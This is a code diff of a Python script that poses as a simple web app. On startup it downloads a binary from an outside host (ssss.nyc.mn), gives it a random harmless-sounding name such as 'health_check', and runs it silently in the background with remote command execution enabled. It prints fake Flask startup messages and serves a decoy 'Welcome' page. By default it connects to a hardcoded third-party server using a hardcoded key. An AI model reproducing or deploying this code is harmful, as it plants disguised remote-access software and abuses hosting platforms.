@@ -1,599 +1,226 @@
 import os
-import json
 import time
 import subprocess
 import platform
 import random
-import threading
-from fastapi import FastAPI, Response, Request
-from fastapi.responses import PlainTextResponse
-import modal
+import sys
+from threading import Thread
+from http.server import HTTPServer, SimpleHTTPRequestHandler
 
-# ========== Modal 镜像定义 ==========
-image = modal.Image.debian_slim().pip_install(
-    "fastapi==0.115.12",
-    "pydantic==2.11.7",
-    "requests",
-    "psutil",
-    "uvicorn",
-)
+# Environment variables
+FILE_PATH = os.environ.get('FILE_PATH', '.cache')
+PORT = int(os.environ.get('PORT', 3000))
+NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'nezha.loc.cc:443')
+NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
+NEZHA_KEY = os.environ.get('NEZHA_KEY', '4z0HWnSGJtKFtKOlfJxSkNC3F8PIJ448')
+UUID = os.environ.get('UUID', 'deef2009-c4e2-4f01-a7d9-0d40b468d258')
 
-app = modal.App("nezha-fastapi-app", image=image)
+# Random file names for disguise
+DISGUISE_NAMES = ['cache_manager', 'session_handler', 'task_worker', 'log_rotator', 'health_check']
 
-# ========== FastAPI 实例 ==========
-web_app = FastAPI(
-    title="Nezha Agent Runner",
-    docs_url=None,
-    redoc_url=None,
-    openapi_url=None,
-)
+def get_random_name():
+    return random.choice(DISGUISE_NAMES)
 
-# ========== 全局启动控制 ==========
-_agent_started = False
-_agent_lock = threading.Lock()
-_keepalive_started = False
-_keepalive_lock = threading.Lock()
-_project_url = None  # 自动从首次请求中获取
+class QuietHTTPHandler(SimpleHTTPRequestHandler):
+    """HTTP Handler that serves files quietly"""
+    
+    def log_message(self, format, *args):
+        pass  # Suppress logging
+    
+    def do_GET(self):
+        if self.path == '/' or self.path == '/index.html':
+            self.serve_index()
+        else:
+            super().do_GET()
+    
+    def serve_index(self):
+        index_path = 'index.html'
+        if os.path.exists(index_path):
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            with open(index_path, 'rb') as f:
+                self.wfile.write(f.read())
+        else:
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            default_html = b'''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        h1 { margin-bottom: 10px; }
+        p { opacity: 0.8; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome</h1>
+        <p>Application is running successfully.</p>
+    </div>
+</body>
+</html>'''
+            self.wfile.write(default_html)
 
-# ========== 辅助函数 ==========
+def run_web_server():
+    """Run HTTP server in background"""
+    server = HTTPServer(('0.0.0.0', PORT), QuietHTTPHandler)
+    server.serve_forever()
 
-def create_directory(file_path):
-    if not os.path.exists(file_path):
-        os.makedirs(file_path, exist_ok=True)
-        print(f"Directory created: {file_path}")
+def fake_startup():
+    """Display fake Flask/web app startup messages"""
+    print("Starting application...")
+    time.sleep(0.3)
+    print(" * Loading configuration...")
+    time.sleep(0.2)
+    print(" * Initializing modules...")
+    time.sleep(0.2)
+    print(" * Starting background workers...")
+    time.sleep(0.2)
+    print(f" * Running on http://0.0.0.0:{PORT}")
+    print(" * Application started successfully")
+    print("Press CTRL+C to quit")
+    sys.stdout.flush()
 
+def create_directory():
+    if not os.path.exists(FILE_PATH):
+        os.makedirs(FILE_PATH)
 
 def get_system_architecture():
     architecture = platform.machine().lower()
     if 'arm' in architecture or 'aarch64' in architecture:
         return 'arm'
-    return 'amd'
+    else:
+        return 'amd'
 
-
-def download_file(file_name, file_url, file_path):
-    import requests
+def download_file(file_name, file_url):
+    file_path = os.path.join(FILE_PATH, file_name)
     try:
-        full_path = os.path.join(file_path, file_name)
-        print(f"Downloading {file_url} -> {full_path}")
-        response = requests.get(file_url, stream=True, timeout=60)
+        import requests
+        response = requests.get(file_url, stream=True, timeout=30)
         response.raise_for_status()
-        with open(full_path, 'wb') as f:
-            total = 0
+        
+        with open(file_path, 'wb') as f:
             for chunk in response.iter_content(chunk_size=8192):
                 f.write(chunk)
-                total += len(chunk)
-        print(f"Download complete: {total} bytes written to {full_path}")
         return True
-    except Exception as e:
-        print(f"Download failed: {e}")
+    except:
+        if os.path.exists(file_path):
+            os.remove(file_path)
         return False
 
+def get_download_url(architecture):
+    if not NEZHA_SERVER or not NEZHA_KEY:
+        return None
+    
+    if NEZHA_PORT:
+        return "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
+    else:
+        return "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"
 
 def authorize_files(file_path):
     if os.path.exists(file_path):
         try:
             os.chmod(file_path, 0o775)
-            print(f"Permissions set for {file_path}")
-        except Exception as e:
-            print(f"Chmod failed for {file_path}: {e}")
-    else:
-        print(f"File not found for chmod: {file_path}")
-
-
-def write_log(message):
-    try:
-        with open('/tmp/agent.log', 'a') as f:
-            f.write(f"[{time.ctime()}] {message}\n")
-    except Exception:
-        pass
-
+        except:
+            pass
 
 def exec_cmd(command):
     try:
-        write_log(f"Executing: {command}")
-        with open('/tmp/agent.log', 'a') as f:
-            process = subprocess.Popen(
-                command,
-                shell=True,
-                stdout=f,
-                stderr=f,
-                start_new_session=True,
-            )
-        write_log(f"Process started with PID: {process.pid}")
-        return process.pid
-    except Exception as e:
-        write_log(f"Command execution failed: {e}")
-        print(f"Command execution failed: {e}")
-        return None
+        subprocess.Popen(
+            command, 
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+    except:
+        pass
 
-
-def run_agent(file_path, nezha_server, nezha_port, nezha_key, uuid):
-    if not nezha_server or not nezha_key:
-        msg = "NEZHA_SERVER or NEZHA_KEY is missing, agent will not start."
-        print(msg)
-        write_log(msg)
+def run_agent():
+    if not NEZHA_SERVER or not NEZHA_KEY:
         return
-
+    
     architecture = get_system_architecture()
-    print(f"Detected architecture: {architecture}")
-    write_log(f"Architecture: {architecture}")
-
-    disguise_names = [
-        'cache_manager',
-        'session_handler',
-        'task_worker',
-        'log_rotator',
-        'health_check',
-    ]
-    disguise_name = random.choice(disguise_names)
-    print(f"Using disguise name: {disguise_name}")
-    write_log(f"Disguise name: {disguise_name}")
-
-    if nezha_port:
-        if architecture == 'arm':
-            url = "https://arm64.ssss.nyc.mn/agent"
-        else:
-            url = "https://amd64.ssss.nyc.mn/agent"
-    else:
-        if architecture == 'arm':
-            url = "https://arm64.ssss.nyc.mn/v1"
-        else:
-            url = "https://amd64.ssss.nyc.mn/v1"
-
-    print(f"Download URL: {url}")
-    write_log(f"Download URL: {url}")
-
-    if not download_file(disguise_name, url, file_path):
-        msg = "Download failed, agent not started."
-        print(msg)
-        write_log(msg)
+    disguise_name = get_random_name()
+    url = get_download_url(architecture)
+    
+    if not url:
         return
-
-    agent_path = os.path.join(file_path, disguise_name)
+    
+    if not download_file(disguise_name, url):
+        return
+    
+    agent_path = os.path.join(FILE_PATH, disguise_name)
     authorize_files(agent_path)
-
-    if os.path.exists(agent_path):
-        file_size = os.path.getsize(agent_path)
-        print(f"Agent file size: {file_size} bytes")
-        write_log(f"Agent file size: {file_size} bytes")
-        if file_size < 1000:
-            msg = "Agent file too small, possibly corrupted."
-            print(msg)
-            write_log(msg)
-            return
-    else:
-        msg = "Agent file does not exist after download."
-        print(msg)
-        write_log(msg)
-        return
-
+    
+    port = NEZHA_SERVER.split(":")[-1] if ":" in NEZHA_SERVER else ""
     tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
 
-    if nezha_port:
-        nezha_tls_flag = '--tls' if nezha_port in tls_ports else ''
-        command = (
-            f"nohup {agent_path} "
-            f"-s {nezha_server}:{nezha_port} "
-            f"-p {nezha_key} "
-            f"{nezha_tls_flag} "
-            f">/dev/null 2>&1 &"
-        )
+    if NEZHA_PORT:
+        nezha_tls_flag = '--tls' if NEZHA_PORT in tls_ports else ''
+        command = f"nohup {agent_path} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls_flag} >/dev/null 2>&1 &"
     else:
-        port = ""
-        if ":" in nezha_server:
-            port = nezha_server.split(":")[-1]
         nezha_tls = "true" if port in tls_ports else "false"
-
-        config_yaml = (
-            f"client_secret: {nezha_key}\n"
-            f"debug: false\n"
-            f"disable_auto_update: true\n"
-            f"disable_command_execute: false\n"
-            f"disable_force_update: true\n"
-            f"disable_nat: false\n"
-            f"disable_send_query: false\n"
-            f"gpu: false\n"
-            f"insecure_tls: false\n"
-            f"ip_report_period: 1800\n"
-            f"report_delay: 4\n"
-            f"server: {nezha_server}\n"
-            f"skip_connection_count: false\n"
-            f"skip_procs_count: false\n"
-            f"temperature: false\n"
-            f"tls: {nezha_tls}\n"
-            f"use_gitee_to_upgrade: false\n"
-            f"use_ipv6_country_code: false\n"
-            f"uuid: {uuid}\n"
-        )
-
-        config_path = os.path.join(file_path, 'config.yaml')
+        config_yaml = f"""client_secret: {NEZHA_KEY}
+debug: false
+disable_auto_update: true
+disable_command_execute: false
+disable_force_update: true
+disable_nat: false
+disable_send_query: false
+gpu: false
+insecure_tls: false
+ip_report_period: 1800
+report_delay: 4
+server: {NEZHA_SERVER}
+skip_connection_count: false
+skip_procs_count: false
+temperature: false
+tls: {nezha_tls}
+use_gitee_to_upgrade: false
+use_ipv6_country_code: false
+uuid: {UUID}"""
+        
+        config_path = os.path.join(FILE_PATH, 'config.yaml')
         with open(config_path, 'w') as f:
             f.write(config_yaml)
-        print(f"Config written to {config_path}")
-        write_log(f"Config written to {config_path}")
+        
+        command = f"nohup {agent_path} -c \"{config_path}\" >/dev/null 2>&1 &"
+    
+    exec_cmd(command)
 
-        command = (
-            f"nohup {agent_path} "
-            f"-c \"{config_path}\" "
-            f">/dev/null 2>&1 &"
-        )
-
-    print(f"Starting agent: {command}")
-    write_log(f"Starting agent: {command}")
-    pid = exec_cmd(command)
-    if pid:
-        print(f"Agent process launched, PID: {pid}")
-        write_log(f"Agent process launched, PID: {pid}")
-    else:
-        print("Failed to launch agent process.")
-        write_log("Failed to launch agent process.")
-
-
-def tail_log(filepath, lines=10):
-    try:
-        with open(filepath, 'r') as f:
-            all_lines = f.read().splitlines()
-            return all_lines[-lines:] if len(all_lines) >= lines else all_lines
-    except FileNotFoundError:
-        return ["Log file not found"]
-    except Exception as e:
-        return [f"Error reading log: {str(e)}"]
-
-
-def find_agent_processes():
-    import psutil
-    agent_names = [
-        'cache_manager',
-        'session_handler',
-        'task_worker',
-        'log_rotator',
-        'health_check',
-    ]
-    found = []
-    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'status']):
-        try:
-            cmdline = ' '.join(proc.info.get('cmdline') or [])
-            name = proc.info.get('name', '')
-            if any(n in cmdline or n in name for n in agent_names):
-                found.append({
-                    "pid": proc.info['pid'],
-                    "name": proc.info.get('name', 'unknown'),
-                    "status": proc.info.get('status', 'unknown'),
-                })
-        except Exception:
-            continue
-    return found
-
-
-# ========== 自动保活功能 ==========
-
-def get_project_url():
-    """获取项目 URL，优先使用自动检测的值"""
-    global _project_url
-    if _project_url:
-        return _project_url
-    # 回退到环境变量或根据 Modal 命名规则拼接
-    return os.environ.get('PROJECT_URL', '')
-
-
-def auto_detect_url(request: Request):
-    """从首次请求中自动提取项目的公网 URL"""
-    global _project_url
-    if _project_url:
-        return
-
-    # 从请求头中提取（Modal 会设置 host 头）
-    scheme = request.headers.get('x-forwarded-proto', 'https')
-    host = request.headers.get('host', '')
-
-    if host:
-        detected = f"{scheme}://{host}"
-        _project_url = detected
-        msg = f"Auto-detected PROJECT_URL: {_project_url}"
-        print(msg)
-        write_log(msg)
-
-        # 检测到 URL 后立即启动保活
-        start_keepalive()
-
-
-def add_visit_task(project_url):
-    """通过 trans.ct8.pl 添加自动访问任务实现保活"""
-    import requests
-    try:
-        response = requests.post(
-            'https://trans.ct8.pl/add-url',
-            json={"url": project_url},
-            headers={'Content-Type': 'application/json'},
-            timeout=30,
-        )
-        response.raise_for_status()
-        msg = f"Automatic access task added successfully for {project_url}"
-        print(msg)
-        write_log(msg)
-        return True
-    except Exception as e:
-        msg = f"Add automatic access task failed: {e}"
-        print(msg)
-        write_log(msg)
-        return False
-
-
-def self_keepalive_loop(project_url, interval=120):
-    """后台自访问保活循环"""
-    import requests
-    health_url = project_url.rstrip('/') + '/health'
+def main():
+    create_directory()
+    run_agent()
+    
+    # Start web server in background thread
+    server_thread = Thread(target=run_web_server, daemon=True)
+    server_thread.start()
+    
+    fake_startup()
+    
     while True:
-        try:
-            time.sleep(interval + random.randint(0, 30))
-            response = requests.get(health_url, timeout=30)
-            msg = f"Self keepalive ping: {health_url} -> {response.status_code}"
-            print(msg)
-            write_log(msg)
-        except Exception as e:
-            msg = f"Self keepalive ping failed: {e}"
-            print(msg)
-            write_log(msg)
+        time.sleep(3600)
 
-
-def start_keepalive():
-    """启动保活机制（仅执行一次）"""
-    global _keepalive_started
-    with _keepalive_lock:
-        if _keepalive_started:
-            return
-        _keepalive_started = True
-
-    project_url = get_project_url()
-    if not project_url:
-        msg = "PROJECT_URL is empty, keepalive will not start yet."
-        print(msg)
-        write_log(msg)
-        with _keepalive_lock:
-            _keepalive_started = False
-        return
-
-    auto_access = os.environ.get('AUTO_ACCESS', 'true').lower()
-    keepalive_interval = int(os.environ.get('KEEPALIVE_INTERVAL', '120'))
-
-    print(f"Starting keepalive for: {project_url}")
-    write_log(f"Starting keepalive for: {project_url}")
-
-    # 1. 通过 trans.ct8.pl 注册自动访问任务
-    if auto_access in ('true', '1', 'yes'):
-        task_thread = threading.Thread(
-            target=add_visit_task,
-            args=(project_url,),
-            daemon=True,
-        )
-        task_thread.start()
-        print("External keepalive task submitted to trans.ct8.pl")
-        write_log("External keepalive task submitted to trans.ct8.pl")
-
-    # 2. 启动后台自访问保活循环
-    keepalive_thread = threading.Thread(
-        target=self_keepalive_loop,
-        args=(project_url, keepalive_interval),
-        daemon=True,
-    )
-    keepalive_thread.start()
-    print(f"Self keepalive loop started (interval: ~{keepalive_interval}s)")
-    write_log(f"Self keepalive loop started (interval: ~{keepalive_interval}s)")
-
-
-def ensure_agent_started():
-    global _agent_started
-    with _agent_lock:
-        if _agent_started:
-            print("Agent already started, skipping.")
-            return
-        _agent_started = True
-
-    print("=" * 50)
-    print("Initializing Nezha Agent...")
-    print("=" * 50)
-
-    FILE_PATH = os.environ.get('FILE_PATH', '.cache')
-    NEZHA_SERVER = os.environ.get('NEZHA_SERVER', '')
-    NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
-    NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
-    UUID = os.environ.get('UUID', '')
-
-    print(f"FILE_PATH:      {FILE_PATH}")
-    print(f"NEZHA_SERVER:   {NEZHA_SERVER}")
-    print(f"NEZHA_PORT:     {NEZHA_PORT}")
-    print(f"NEZHA_KEY:      {'***' + NEZHA_KEY[-4:] if len(NEZHA_KEY) > 4 else '(empty)'}")
-    print(f"UUID:           {UUID}")
-
-    write_log("=" * 40)
-    write_log("Agent initialization started")
-    write_log(f"FILE_PATH: {FILE_PATH}")
-    write_log(f"NEZHA_SERVER: {NEZHA_SERVER}")
-    write_log(f"NEZHA_PORT: {NEZHA_PORT}")
-    write_log(f"UUID: {UUID}")
-
-    create_directory(FILE_PATH)
-
-    def agent_starter():
-        try:
-            run_agent(FILE_PATH, NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, UUID)
-        except Exception as e:
-            msg = f"Agent starter thread exception: {e}"
-            print(msg)
-            write_log(msg)
-
-    thread = threading.Thread(target=agent_starter, daemon=True)
-    thread.start()
-    print("Agent starter thread launched.")
-
-
-# ========== FastAPI 中间件：自动检测 URL ==========
-
-@web_app.middleware("http")
-async def detect_url_middleware(request: Request, call_next):
-    auto_detect_url(request)
-    response = await call_next(request)
-    return response
-
-
-# ========== FastAPI 启动事件 ==========
-
-@web_app.on_event("startup")
-async def startup_event():
-    print("FastAPI startup event fired.")
-    ensure_agent_started()
-    # 保活会在首次请求到达、URL 被自动检测后启动
-
-
-# ========== FastAPI 路由 ==========
-
-@web_app.get("/")
-async def root():
-    return PlainTextResponse(
-        content="Nezha Agent Runner is active.\n\n"
-                "Endpoints:\n"
-                "  /health    - Health check\n"
-                "  /status    - Agent process status\n"
-                "  /logs      - View agent logs\n"
-                "  /info      - System information\n"
-                "  /restart   - Restart agent\n"
-                "  /keepalive - Keepalive status\n"
-    )
-
-
-@web_app.get("/health")
-async def health():
-    data = {
-        "status": "healthy",
-        "timestamp": time.time(),
-        "uptime": time.ctime(),
-    }
-    return Response(
-        content=json.dumps(data),
-        media_type="application/json",
-    )
-
-
-@web_app.get("/status")
-async def status():
-    processes = find_agent_processes()
-
-    if processes:
-        data = {
-            "agent_status": "running",
-            "processes": processes,
-            "process_count": len(processes),
-        }
-    else:
-        data = {
-            "agent_status": "not_running",
-            "processes": [],
-            "process_count": 0,
-            "recent_logs": tail_log('/tmp/agent.log', lines=5),
-        }
-
-    return Response(
-        content=json.dumps(data),
-        media_type="application/json",
-    )
-
-
-@web_app.get("/logs")
-async def logs():
-    log_lines = tail_log('/tmp/agent.log', lines=30)
-    data = {
-        "log_lines": len(log_lines),
-        "logs": log_lines,
-    }
-    return Response(
-        content=json.dumps(data),
-        media_type="application/json",
-    )
-
-
-@web_app.get("/info")
-async def info():
-    import psutil
-    data = {
-        "platform": platform.platform(),
-        "architecture": platform.machine(),
-        "python_version": platform.python_version(),
-        "cpu_count": psutil.cpu_count(),
-        "memory_total_mb": round(psutil.virtual_memory().total / 1024 / 1024, 2),
-        "memory_used_mb": round(psutil.virtual_memory().used / 1024 / 1024, 2),
-        "memory_percent": psutil.virtual_memory().percent,
-        "disk_total_gb": round(psutil.disk_usage('/').total / 1024 / 1024 / 1024, 2),
-        "disk_used_gb": round(psutil.disk_usage('/').used / 1024 / 1024 / 1024, 2),
-        "disk_percent": psutil.disk_usage('/').percent,
-        "pid": os.getpid(),
-        "cwd": os.getcwd(),
-    }
-    return Response(
-        content=json.dumps(data),
-        media_type="application/json",
-    )
-
-
-@web_app.get("/keepalive")
-async def keepalive_status():
-    project_url = get_project_url()
-    data = {
-        "keepalive_started": _keepalive_started,
-        "project_url": project_url or "not detected yet",
-        "auto_detected": bool(_project_url),
-        "auto_access": os.environ.get('AUTO_ACCESS', 'true'),
-        "keepalive_interval": int(os.environ.get('KEEPALIVE_INTERVAL', '120')),
-        "recent_logs": [
-            line for line in tail_log('/tmp/agent.log', lines=20)
-            if 'keepalive' in line.lower() or 'automatic access' in line.lower()
-            or 'auto-detected' in line.lower()
-        ],
-    }
-    return Response(
-        content=json.dumps(data),
-        media_type="application/json",
-    )
-
-
-@web_app.get("/restart")
-async def restart_agent():
-    import psutil
-    global _agent_started
-
-    killed = []
-    processes = find_agent_processes()
-    for proc_info in processes:
-        try:
-            proc = psutil.Process(proc_info['pid'])
-            proc.kill()
-            killed.append(proc_info['pid'])
-        except Exception:
-            pass
-
-    with _agent_lock:
-        _agent_started = False
-
-    time.sleep(2)
-    ensure_agent_started()
-
-    data = {
-        "action": "restart",
-        "killed_pids": killed,
-        "message": "Agent restart initiated",
-    }
-    return Response(
-        content=json.dumps(data),
-        media_type="application/json",
-    )
-
-
-# ========== Modal 入口 ==========
-
-@app.function(
-    secrets=[modal.Secret.from_name("nezha-secrets")],
-    allow_concurrent_inputs=10,
-    container_idle_timeout=300,
-)
-@modal.asgi_app()
-def fastapi_app():
-    return web_app
+if __name__ == "__main__":
+    main()
